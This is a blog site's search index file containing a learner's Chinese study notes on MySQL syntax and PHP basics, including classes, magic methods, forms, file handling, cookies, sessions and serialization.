<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MYSQL的简单学习</title>
    <url>/2023/03/21/MYSQL%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="MYSQL简介"><a href="#MYSQL简介" class="headerlink" title="MYSQL简介"></a>MYSQL简介</h2><ol>
<li><strong>关系型数据库</strong><br>MYSQL数据库是一个关系型数据库,关系型数据库就是指,建立在关系模型的基础上,由多张互相连接的二维表组成的数据库</li>
<li><strong>数据模型</strong><br>通过客户端连接数据库管理系统(DBMS),通过DBMS创建数据库,再通过数据库创建数据表<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230321210554.png"></li>
<li><strong>MYSQL启动与连接</strong><br>–启动,以管理员身份运行命令行<code>net start mysql80</code>,关闭<code>net stop mysql80</code><br>–连接,可以用mysql自带的客户端命令行运行,也可以在系统的命令行里输入<code>mysql -u root -p</code></li>
</ol>
<h2 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a>SQL语法</h2><ol>
<li><strong>通用语法</strong><ol>
<li>sql语法是以英文分号<code>;</code>结尾,可以多行书写,或使用空格来增强语句的可读性</li>
<li>MYSQL数据库的语句不区分大小写,但是关键字建议使用大写</li>
<li>注释:   单行注释:<code>--</code>,<code>#</code>    多行注释:<code>/*  */</code></li>
</ol>
</li>
<li><strong>分类</strong><ol>
<li>DDL  数据库定义语言</li>
<li>DML  数据库操作语言</li>
<li>DQL  数据库查询语言</li>
<li>DCL  数据库控制语言<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230321195429.png"></li>
</ol>
</li>
</ol>
<h3 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h3><p>将DDL语句主要分为<strong>数据库</strong>,<strong>表</strong>,<strong>字段</strong>来讲解</p>
<ol>
<li><p><strong>DDL的数据库操作</strong></p>
<ol>
<li>创建新的数据库 <code>create database 数据库名;</code></li>
<li>删除数据库 <code>drop database 数据库名;</code></li>
<li>查询所有数据库 <code>show databases;</code></li>
<li>查询当前数据库 <code>select database();</code></li>
<li>使用,进入数据库 <code>use 数据库名;</code></li>
</ol>
</li>
<li><p><strong>表操作</strong><br>在进行表操作时,必须先进入数据库中(use)</p>
<ol>
<li>创建新的表 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名(</span><br><span class="line">    字段<span class="number">1</span> 类型 [comment 注释],    #有逗号,</span><br><span class="line">    字段<span class="number">2</span> 类型 [comment 注释],    #[]表示里面可有可无</span><br><span class="line">    <span class="keyword">last</span>字段 类型 [comment 注释]  #最后一个字段后面没有逗号</span><br><span class="line">)[comment 注释];    #语句结束需要用分号;</span><br></pre></td></tr></table></figure></li>
<li>删除表 <code>drop table 表名;</code></li>
<li>修改表名 <code>alter table 旧表名 rename to 新表名;</code></li>
<li>查询当前数据库所有表 <code>show tables;</code></li>
<li>查询指定表的建表语句 <code>show creat table 表名;</code></li>
</ol>
</li>
<li><p><strong>字段操作</strong>  </p>
<ol>
<li>增加表中的字段<code>alter table 表名 add 字段名 类型 [comment 注释] [约束];</code></li>
<li>删除表中的字段名<code>alter table 表名 drop 字段名;</code></li>
<li>修改表中的字段数据类型<code>alter table 表名 modify 字段名 新数据类型;</code></li>
<li>修改表中的字段名和字段类型<code>alter table 表名 change 旧字段名 新字段名 新数据类型 [comment 注释] [约束];</code></li>
<li>查询表结构(所有的字段) <code>desc 表名;</code></li>
</ol>
</li>
</ol>
<h3 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h3><p>DML是数据操作语言,主要对表中的数据进行<strong>增删改</strong>的操作</p>
<ol>
<li><p><strong>数据的增加</strong></p>
<ol>
<li>给指定字段添加数据<br><code>insert into 表名(字段1,字段2,...) values(值1,值2,...);</code> &#x2F;&#x2F;指定字段添加一行数据</li>
<li>给全部字段添加数据<br><code>insert into 表名 values(值1,值2,...);</code>  &#x2F;&#x2F;有几个字段就要填写几个值,添加一行数据</li>
<li>指定字段批量添加数据<br><code>insert into 表名(字段1,字段2,...) values(值1,值2,...),(值1,值2,...);</code> &#x2F;&#x2F;指定字段添加好几行</li>
<li>全部字段批量添加数据<br><code>insert into 表名 values(值1,值2,...),(值1,值2,...);</code>  &#x2F;&#x2F;values有几个括号就有几行值</li>
<li>注意: 字符串和日期型数据需要包含在引号中,数据的大小不能超过规定大小</li>
</ol>
</li>
<li><p><strong>数据的删除</strong><br><code>delete from 表名 [where 条件];</code><br>delete删除的不是某一字段的值,而是符合条件的那一整行值,如果没有条件则删除全部数据。<br>如果要删除某一字段的值可以用update将值改为NULL;</p>
</li>
<li><p><strong>数据的修改</strong><br><code>update 表名 set 字段名1=值1,字段名2=值2,...[where 条件];</code><br>条件控制着哪几行做修改,如果没有条件,则修改整张表格</p>
</li>
</ol>
<h3 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h3><p>DQL是数据查询语言,主要用来<strong>查询</strong>数据</p>
<ol>
<li><p><strong>基本查询</strong></p>
<ol>
<li>查询指定字段<code>select 字段1,字段2,... from 表名;</code></li>
<li>查询所有字段<code>select * from 表名;</code>  &#x2F;&#x2F;*代表所有字段,但是不太直观</li>
<li>设置别名<code>select 字段1[as 别名1],字段2 [as 别名2],... from 表名;</code></li>
<li>去除重复内容<code>select [distinct] 字段列表 from 表名;</code>  加上distinct即可</li>
</ol>
</li>
<li><p><strong>条件查询</strong><br>过滤不符合条件的数据</p>
<ol>
<li><code>select 字段列表 from 表名 where 字段1 条件 [and 字段2 条件...];</code><br>条件:</li>
<li><code>between 最小值 and 最大值</code>  在最小值(包含)和最大值(包含)之间的结果</li>
<li><code>in()</code>   在只要满足in()中的其中一个条件的数据都会被打印出来</li>
<li><code>like 占位符</code>  占位符**_**代表一个字符(如<code>__</code>表示两个字符大小的数据),  **%**代表任意个字符(如 <code>%x</code> 代表所有以x结尾的数据)</li>
<li><code>is null</code>,<code>is not null</code>  数据是null</li>
<li>其余常见<code>&gt;</code>,<code>&lt;</code>,<code>&gt;=</code>,<code>&lt;=</code>,<code>=</code>,<code>!= 和 &lt;&gt;</code>,<code>and 和 &amp;&amp;</code>,<code>or 和 ||</code>,<code>not 和 !</code></li>
</ol>
</li>
<li><p><strong>聚合函数</strong><br>聚合函数都是作用于数据的某一列的(某一字段), 是某一列的运算(null值不参与所有聚合函数的运算)</p>
<ol>
<li><code>select 聚合函数(字段列表) from 表名;</code>  </li>
<li>常见聚合函数<br> <img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230325193715.png"></li>
</ol>
</li>
<li><p><strong>分组查询</strong><br><code>select 聚合函数(字段列表) from 表名 [where 条件] group by 分组字段名(或聚合函数) [having 分组后再次过滤的条件];</code><br><strong>where</strong> 是分组前的过滤, <strong>group by</strong> 是分组, <strong>having</strong> 是分组之后的过滤<br><code>where</code>不能对集合函数进行判断,而<code>having</code>可以<br>举个例子:<br><code>select school,count(*) from student where age&lt;16 group by school having count(student)&gt;100;</code><br>含义:查询所有年龄小于16的学生(<code>select count(*) from student where age&lt;16</code>),并根据学校进行分组(<code>group by school</code>),统计各个学校的学生数量(<code>count(*)</code>),选出学生大于一百的学校(<code>having count(student)&gt;100</code>)</p>
</li>
<li><p><strong>排序查询</strong></p>
<ol>
<li>语法:  <code>select 字段列表 from 表名 order by 字段1 [desc],字段2 [desc];</code></li>
<li><strong>desc</strong>表示该查询结果为降序排序,如果不写,则默认是升序<strong>asc</strong></li>
<li>如果有多个字段进行排序,当第一个字段相同时,再按照第二个字段的排序</li>
</ol>
</li>
<li><p><strong>分页查询</strong><br>分页查询的语法,不同的数据库有不同的实现,这里介绍mysql的<strong>limit</strong><br>语法:  <code>select 字段列表 from 表名 limit 起始值,查询数据数;</code><br>注意:  起始值是以0作为开始,展示的数据是从(起始值+1)开始<br>如第一页可以表示成:<br><code>select age from user limit 0,5;</code>  &#x2F;&#x2F;表示从第1条数据开始,展示后面的5条数据(包含第一条)<br>例如<br><code>select * from user limit 0,1;</code>  &#x2F;&#x2F;表示展示这张表中第一行的的全部数据</p>
</li>
<li><p><strong>编写顺序与执行顺序</strong><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230325212816.png"><br>蓝色代表编写顺序,红色序号代表执行顺序</p>
</li>
</ol>
<h3 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h3><p>DCL是数据控制语言,主要作用是管理<strong>用户</strong>,控制<strong>访问权限</strong></p>
<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>联合查询(union查询),就是把多次查询的结果合并起来,形成一个新的查询结果集</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表a</span><br><span class="line"><span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> 字段列表 <span class="keyword">from</span> 表b;</span><br></pre></td></tr></table></figure>
<p>注意: <code>union</code>去重, <code>union all</code>不去重<br>对于联合查询的多张表的列数必须保持一致,字段类型也必须保持一致。</p>
]]></content>
      <categories>
        <category>MYSQL</category>
      </categories>
      <tags>
        <tag>MYSQL</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP的类与对象</title>
    <url>/2023/03/17/PHP%E7%9A%84%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><ol>
<li><strong>定义类</strong><br>在php中使用<code>class name&#123;&#125;</code></li>
<li><strong>实例化</strong><br>使用 <code>$name=new name()</code>;创建一个对象$name。</li>
<li><strong>类属性与类方法</strong><br>在类的外部使用类属性和类方法时，要通过实例化的对象<code>$name -&gt;a</code> ,<code>$name -&gt;a()</code><br>类的内部访问时要通过伪变量<code>$this -&gt;</code>（$this当前的对象）</li>
<li><strong>类常量</strong><br>在类的内部定义常量用<code>const</code>关键字，类中的常量归类所有，而不是归对象所有，要访问类中的对象，在外部可以使用<code>类名::常量名</code>,在类的内部可以使用<code>self::类名</code>调用（self当前的类）。</li>
<li><strong>static(静态)</strong><br>–声明类的属性或方法为 static(静态)，就可以不实例化类而直接访问。声明为静态后，此时的方法和属性就归类所有，不归对象所有。<br>–静态成员的访问，外部：<code>类名::成员名</code>,内部:可以使用<code>self::成员名</code>或<code>类名::成员名</code>.(成员包括属性与方法)<br>–实际上，在低版本中php中的方法默认是静态的，所以事实上静态方法还是可以通过实例化的对象访问（不推荐），静态属性则不行。<br>–由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。</li>
</ol>
<h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><ol>
<li><strong>继承的格式</strong><br><code>class 子类名 extends 父类名&#123;&#125;</code></li>
<li><strong>特点</strong><br>–php语言是单继承<br>–子类会继承父类的公共的和受保护的成员属性和方法<br>–子类可以扩展新的属性和方法<br>–子类可以有和父类同名的方法和属性，这时候子类会覆盖父类，叫做重载。这时候要调用原 本的父类方法可以用<code>parent::方法()</code>，而<code>$this-&gt;方法()</code>则是使用子类重载后的方法。<br>–魔术方法也可以被子类继承<br>–如果子类没有构造方法，将继承父类的构造方法，如果有，则覆盖父类的构造方法（重载）<br>可以用<code>parent::__construct()</code>调用父类的构造方法<br>–如果父类中的办法被声明为<code>final</code>,则子类无法覆盖该办法.同样如果一个类被声明为final,则不能被继承.需要注意的是:属性不能被定义为final,只有类和办法才能被定义final.</li>
</ol>
<h2 id="访问控制与封装"><a href="#访问控制与封装" class="headerlink" title="访问控制与封装"></a>访问控制与封装</h2><p>在类中创建属性（成员变量）和方法（成员函数）时，需要在前面加上访问控制关键词<br>    *   public   （公有）：公有的类成员可以在任何地方被访问。<br>    *   protected （受保护）：受保护的类成员则可以被其自身以及其子类和父类访问。<br>    *   private  （私有）：私有的类成员则只能被其定义所在的类访问。<br>    *   注意：子类继承父类的方法后重载，访问控制只能和原先相同或者更宽松<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230319220409.png"></p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>魔术方法是一种在类中的特殊函数，所以的魔术方法都是以<code>__</code>双下划线开头的<br>主要从 <strong>触发时机</strong>， <strong>作用</strong> ， <strong>参数</strong> ， <strong>返回值</strong> 四个方面来分析一个魔术方法</p>
<ol>
<li><strong>构造函数</strong><br><code>__construct()</code><br>-触发时机：在对象进行实例化的时候自动触发<br>-作用：初始化成员属性<br>-参数：无<br>-返回值：无</li>
<li><strong>析构函数</strong><br><code>__destruct()</code><br>-触发时机：在对象销毁时自动触发（unset() 或 页面执行完毕）<br>-作用：回收对象使用过程中的资源<br>-参数：无<br>-返回值：无</li>
<li><code>__get($propertyName)</code><br>-触发时机：类的外部访问私有成员,不存在成员的时候自动触发<br>-作用：1.防止报错，2.提供访问私有属性的后门（不能修改）<br>-参数：一个，是访问的私有对象的属性名称<br>-返回值：可以有，可以没有</li>
<li><code>__set($propertyName,$value)</code><br>-触发时机：类的外部设置私有成员的值时候自动触发<br>-作用：1.防止报错，2.设置私有属性<br>-参数：两个，是访问的私有对象的属性名称，属性的值<br>-返回值：无</li>
<li><code>__isset($propertyName)</code><br>-触发时机：在类外部对私有成员进行isset检测时自动触发<br>-作用：代替外部isset，在类的内部进行变量检测<br>-参数：一个，是检测的私有成员的属性名称<br>-返回值：返回一个布尔值,是isset的结果</li>
<li><code>__unset()</code><br>-触发时机：试图对私有成员进行unset删除时自动触发<br>-作用：代替外部unset，在类的内部进行变量删除<br>-参数：一个，是要删除的私有成员的属性名称<br>-返回值：无</li>
<li><code>__call($funName,$arguments)</code>，<code>__callStatic()静态</code><br>-触发时机：在对象调用一个不可访问,不存在的方法时自动触发<br>-作用：防止调用的方法不存在而导致程序终止<br>-参数：两个，$funName是不存在的函数名，$arguments是以数组的形式接收不存在方法的多个参数<br>-返回值：可以返回任意类型的值</li>
<li><code>__toString()</code><br>-触发时机：一个类被当成字符串时自动触发（例如echo 一个对象名）<br>-作用：防止报错,返回一个字符串<br>-参数：无<br>-返回值：必须返回一个字符串</li>
<li><code>__invoke()</code><br>-触发时机：当你试图以函数的方式调用一个对象时,这个方法会被自动调用。<br>-作用：防止报错,可以在这个方法里实现任意操作<br>-参数：可以接受任意数量的参数<br>-返回值：可以返回任意类型的值。</li>
<li><code>__autoload($ClassName)</code><br>-触发时机：使用一个未定义的类时，自动调用 __autoload() 函数<br>-作用：当通过new来实例化一个类时，通过__autoload自动包含对应的文件<br>-参数：一个参数，即未定义的类名<br>-返回值：无<br>-实例:<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class_name</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$class_name</span> . <span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br></pre></td></tr></table></figure></li>
<li><code>__sleep()</code><br>-触发时机：在类外部调用序列化<code>serialize()</code>时自动调用<br>-作用：如果只想序列化对象中的某些属性，只有返回的数组中有的属性名才会被序列化<br>-参数：无<br>-返回值：返回一个包含对象中需要序列化的属性名的数组。</li>
<li><code>__wakeup</code><br>-触发时机：在类外部调用反序列化<code>unserialize()</code>时自动调用<br>-作用：重新初始化对象的状态，或者重新建立数据库连接、重新分配资源等。(比如在构造函数中给属性赋值了,但是序列化时只保留属性,可以在反序列化时重新赋值)<br>-参数：无<br>-返回值：无</li>
</ol>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP的学习2.0</title>
    <url>/2023/03/18/PHP%E7%9A%84%E5%AD%A6%E4%B9%A02-0/</url>
    <content><![CDATA[<p>前面经过一周的PHP学习，这是第二周</p>
<h2 id="简单表单"><a href="#简单表单" class="headerlink" title="简单表单"></a>简单表单</h2><p>语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;提交表单的地址&quot;</span> method=<span class="string">&quot;提交表单的方式&quot;</span>&gt;  <span class="comment">//GET POST REQUEST</span></span><br><span class="line"> &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;提交数据的名称&quot;</span>&gt;   <span class="comment">//type属性中的text表示上传类型是文本</span></span><br><span class="line"> &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;提交数据的名称&quot;</span>&gt;</span><br><span class="line"> &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;   <span class="comment">//type属性中的submit表示这是一个提交按钮</span></span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
<p>可以用超全局变量<code>$_POST[]</code>,<code>$_GET[]</code>,<code>$_REQUEST</code>获取提交的表单数据</p>
<h2 id="文件上传表单"><a href="#文件上传表单" class="headerlink" title="文件上传表单"></a>文件上传表单</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;upload_file.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span>&gt;&lt;br&gt;  </span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>和简单表单类似，将type属性改成<strong>file</strong>表示上传的是一个文件.<br>enctype表示提交表单要使用哪种内容类型，文件用<code>enctype=&quot;multipart/form-data&quot;</code>.<br>方式一般使用post类型。<br>上传的文件保存在超全局变量<code>$_FILES</code>中<br>如在<strong>upload_file.php</strong>中使用<code>print_r($_FILES)</code>,可以打印查看文件的信息<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230318151115.png"></p>
<h2 id="date格式化日期"><a href="#date格式化日期" class="headerlink" title="date格式化日期"></a>date格式化日期</h2><p><code>date(&quot;format&quot;)</code><br>format可以是 d（天），m（月），Y（年）,中间可以插入其他字符<br>例如 <code>echo date(Y/m/d)</code>  结果<code>2023/3/18</code></p>
<h2 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h2><p><code>include &#39;文件名&#39;;</code><br><code>require &#39;文件名&#39;;</code><br><code>include_once &#39;文件名&#39;;</code><br><code>require_once &#39;文件名&#39;;</code><br>区别找不到文件时require生成致命错误，include产生一个警告，继续执行。<br>一个文件包含两次相同的文件会报错，加上_once就只会扫描一次，不会报错</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><ol>
<li><p><strong>打开文件</strong><br><code>$file=fopen(&quot;文件名&quot;，&quot;打开模式&quot;);</code><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230318111159.png" alt="几种模式"></p>
</li>
<li><p><strong>关闭文件</strong><br><code>fcloes($file);</code>  &#x2F;&#x2F;<em>流程，打开文件，执行一些代码，关闭文件</em></p>
</li>
<li><p><strong>检测文件末尾（EOF）</strong><br><code>feof($file);</code><br>在循环遍历未知长度的数据时，feof() 函数很有用。</p>
</li>
<li><p><strong>逐行读取文件</strong><br><code>fgets($file);</code><br>在调用该函数之后，文件指针会移动到下一行.</p>
</li>
<li><p><strong>逐字符读取文件</strong><br><code>fgetc($file)</code><br>在调用该函数之后，文件指针会移动到下一个字符。</p>
</li>
</ol>
<p><strong>完整演示</strong>一遍操作文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;welcome.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;无法打开文件!&quot;</span>);  <span class="comment">//打开文件只读</span></span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$file</span>))  <span class="comment">//判断是否到EOF</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">fgetc</span>(<span class="variable">$file</span>);  <span class="comment">//逐字符遍历数组，也可以fgets逐行</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);   <span class="comment">//关闭文件</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>cookie常用于识别用户，是服务器留在用户计算机上的小文件，计算机请求页面时，计算机会发送cookie。</p>
<ol>
<li><strong>创建cookie</strong><br><code>&lt;?php  setcookie(name,value,expire,path,domain);  ?&gt;</code><br> &#x2F;&#x2F;必须位于<html>标签之前<br>例如<code>setcookie(&quot;user&quot;, &quot;miao&quot;, time()+3600)</code> &#x2F;&#x2F;名user，值miao，3600秒后过期<br>也可以<code>$a=time()+60*60*24*30; setcookie(&quot;user&quot;, &quot;miao&quot;, $a)</code><br>&#x2F;&#x2F;60秒<em>60分</em>24小时*30天</li>
<li><strong>取回cookie的值</strong><br>可以用超全局变量<code>$_COOKIE[]</code>取回cookie<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];   <span class="comment">// 输出user的cookie 值</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_COOKIE</span>);     <span class="comment">// 查看所有 cookie</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><strong>删除cookie</strong><br>把<code>time()</code>改成过去的时间<br>例如<code>setcookie(&quot;user&quot;, &quot;miao&quot;, time()-360);</code> </li>
<li><strong>检测是否设置了cookie</strong><br>使用<code>isset($_COOKIE[])</code></li>
<li><strong>编码方式</strong><br>在发送cookie时，cookie的值会自动进行URL编码,在取回时进行自动解码。为防止URL编码，请使用<code>setrawcookie()</code>取而代之</li>
</ol>
<h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>session变量是用于储存用户会话信息（用户数据），更改用户会话信息的设置。工作机制：为每个访客创建一个唯一的id(UID)，并基于这个UID来存储变量。UID存储在cookie中，或者通过URL进行传导</p>
<ol>
<li><strong>启动会话</strong><br><code>session_start()</code>  &#x2F;&#x2F;&#x2F;<em>函数必须位于<html>标签之前</em></li>
<li><strong>储存session变量</strong><br>使用<code>$_SESSION[]</code>超级变量，并进行赋值<br>例如<br>可以将用户的浏览量设置成<br><code>$_SESSION[&#39;views&#39;]</code>,每次访问后使<code>$_SESSION[&#39;views&#39;]+=1</code><br>或是给用户添加admin权限等<br>如果用户成功登陆的话，储存一个登陆成功的凭证的session <code>$_SESSION[admin]=ture</code></li>
<li><strong>销毁Session</strong><br>如果希望删除某些session数据，可以使用<code>unset()</code>或<code>session_destroy()</code>函数<br><strong>unset()</strong> 函数用于释放指定的session变量:例如  <code>$_SESSION[&#39;views&#39;]</code><br><strong>session_destroy()</strong> 函数彻底销毁重置session  </li>
<li><strong>检测是否设置了session</strong><br>使用<code>isset($_SESSION[])</code></li>
</ol>
<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>JSON定义</strong> ：一种轻量级的数据交换语言，以文本字符串为基础</p>
<ol>
<li>{} 双括号表示对象</li>
<li>[] 中括号表示数组</li>
<li>“” 双引号内是属性或值</li>
<li>: 冒号表示后者是前者的值(这个值可以是字符串、数字、也可以是另一个数组或对象)</li>
<li>，逗号用来分隔属性或者对象</li>
<li>例如<code>&#123;&quot;a&quot;:16,&quot;b&quot;:18,&quot;c&quot;:20&#125;</code></li>
</ol>
<p><strong>PHP JSON</strong></p>
<ol>
<li><p><code>json_encode($value，参数)</code>     &#x2F;&#x2F;   对变量（对象也可以）进行json编码<br><code>JSON_UNESCAPED_UNICODE</code>  参数选项，如果我们不希望中文被编码，可以添加该参数。</p>
</li>
<li><p><code>json_decode(json字符串)</code>  对json格式字符解码，转化成php变量</p>
</li>
</ol>
<p><strong>serialize</strong><br><code>serialize()</code>序列化是将变量(或者对象)转换为可保存或传输的字符串的过程<br><strong>unserialize</strong><br><code>unserialize()</code>反序列化就是在适当的时候把这个字符串再转化成原来的变量使用</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP语言的学习</title>
    <url>/2023/03/13/PHP%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>以<code>&lt;?php</code>  作为开头<br>每句话以 <code>;</code>结尾<br><code>?&gt;</code>  作为结尾</p>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><code>//</code>  <em>单行注释</em><br><code>/**  */</code>   <em>多行注释</em></p>
<h2 id="传值与传址"><a href="#传值与传址" class="headerlink" title="传值与传址"></a>传值与传址</h2><p><code>$a=$b</code>   <em>传值，指向不同的内存空间</em><br><code>$a=&amp;$b</code>  <em>传址，指向相同的内存空间，同时改变</em></p>
<h2 id="局部变量，全局变量与超全局变量"><a href="#局部变量，全局变量与超全局变量" class="headerlink" title="局部变量，全局变量与超全局变量"></a>局部变量，全局变量与超全局变量</h2><p>全局声明（函数外声明）的变量会保存在<code>$-GLOBALS</code>中，函数内默认不能访问全局变量，访问需要加上global关键字<br>也可以使用全局数组<code>$GLOBALS(&#39;变量名&#39;)</code>调用全局变量</p>
<p><em><strong>超全局变量</strong></em><br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230314100903.png"><br><a href="https://www.runoob.com/php/php-superglobals.html">菜鸟教程全局变量</a></p>
<p>局部变量：函数内部声明的变量，只能在函数内部使用</p>
<h2 id="变量检测和变量删除"><a href="#变量检测和变量删除" class="headerlink" title="变量检测和变量删除"></a>变量检测和变量删除</h2><p><code>isset()</code>   <em>检测</em><br><code>unset()</code>   <em>删除，在函数中用global引入的全局变量无法删除</em></p>
<h2 id="static关键字"><a href="#static关键字" class="headerlink" title="static关键字"></a>static关键字</h2><p>延长生命周期（好像和c语言一样）</p>
<h2 id="字符串界定符"><a href="#字符串界定符" class="headerlink" title="字符串界定符"></a>字符串界定符</h2><p>作用就是按照原样，包括换行格式什么的，输出在其内部的东西,任何特殊字符都不需要转义</p>
<blockquote>
</blockquote>
<pre><code>$str =&lt;&lt;&lt;EOF
EOF;
</code></pre>
<h2 id="strlen-和mb-strlen"><a href="#strlen-和mb-strlen" class="headerlink" title="strlen()和mb_strlen()"></a>strlen()和mb_strlen()</h2><p><code>strlen()</code>   <em>用于计算字符串长度</em><br><code>mb_strlen(变量名,&#39;编码形式（utf8）&#39;)</code>   <em>宽字节计算长度</em></p>
<h2 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h2><p>php是弱类型语音，经常要对变量进行比较；<br><strong>松散比较</strong>：使用两个<code>==</code>，只比较值<br><strong>严格比较</strong>：使用三个<code>===</code>，既比较值，也比较类型</p>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量被定义后，在脚本其他任何地方不能被改变，常量是全局的，函数内也可以<strong>直接使用</strong></p>
<ol>
<li>使用<strong>define(“名称”,”常量的值”,是否区分大小写)</strong><br>例如 <code>define(&quot;GREE&quot;,&quot;欢迎欢迎&quot;,ture)</code>&#x2F;&#x2F;<em>常量名前面不能加$</em></li>
<li>使用<strong>const 名称&#x3D;常量的值</strong><br>例如 <code>const NAME=&#39;哈哈哈</code>   &#x2F;&#x2F;<em>常量一般情况下用大写字母</em></li>
</ol>
<h2 id="并置运算符"><a href="#并置运算符" class="headerlink" title="并置运算符"></a>并置运算符</h2><p>使两个字符串相加<br>例如 <code>&quot;hello&quot;.&quot;world&quot;</code></p>
<h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h2><p>用于在字符串内找一个指定的字符或文本，如果找到匹配则返回第一个匹配（<strong>第一个字符要从0开始算</strong>）的字符位置，否则返回FALSE<br>例如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$txt</span>=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$txt</span>,<span class="string">&quot;world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出 6 </p>
